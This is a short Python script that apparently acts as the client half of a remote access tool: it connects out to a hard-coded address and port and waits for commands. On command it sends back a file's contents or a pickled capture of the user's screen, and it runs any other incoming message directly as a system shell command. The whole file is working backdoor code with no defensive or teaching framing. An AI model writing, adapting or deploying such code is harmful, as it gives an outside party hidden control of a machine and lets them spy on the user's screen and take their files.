import socket
import os   
import mss
import pickle
#import json

s = socket.socket()    
 
is_alive = True
host = "10.0.33.155"
port = 12345  

try:
    s.connect((host, port)) 
except:
    print("Connection Failed")
    exit()

print(f"Successfully Connected to {host}:{port}")


while is_alive:
    msg = s.recv(1024).decode()
    print("Message: " + msg)
    
    # Returns the Contents of test.txt
    if msg == "return":
        with open("test.txt", "r") as f:
            s.send(f.read().encode())

    elif msg == "exit":
        is_alive = False
    
    # Returns the data for the Users Screen
    elif msg == "screen":
        # sct = mss.mss()
        # monitor = sct.monitors[1]
        # frame = sct.grab(monitor).rgb

        # print("Data Length: ", len(frame))

        # s.send(str(len(frame)).encode())
        # s.send(frame)

        sct = mss.mss()
        monitor = sct.monitors[1]
        frame = sct.grab(monitor)
        serialized = pickle.dumps((frame.width, frame.height, frame.rgb))
        #print(serialized)

        s.send(str(len(serialized)).encode())
        s.send(serialized)


    else:
        os.system(msg)
 
s.close()
#stream.stop()
print("Connection Termination Successful")